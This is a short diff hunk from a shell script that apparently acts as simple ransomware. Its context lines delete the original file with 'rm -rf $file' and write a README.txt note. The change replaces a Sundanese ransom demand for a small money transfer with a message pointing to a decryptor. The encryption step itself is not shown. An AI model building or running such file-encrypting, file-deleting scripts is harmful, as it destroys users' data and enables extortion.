@@ -17,7 +17,7 @@ do
 done
 # echo "Removing original file..."
 rm -rf $file
-echo "Nuhun bund... kabeh data di PC ieu' urang enkripsi, lamun bunda hoyong datana balik, sok transfer sarebu rupiah" > README.txt
+echo "File encrypted, use Bunda-Euis-Decryptor to decrypt." > README.txt
 sleep 1
 echo "--------------------------------------------------------------------------------------------------------------------------------------"
 ls
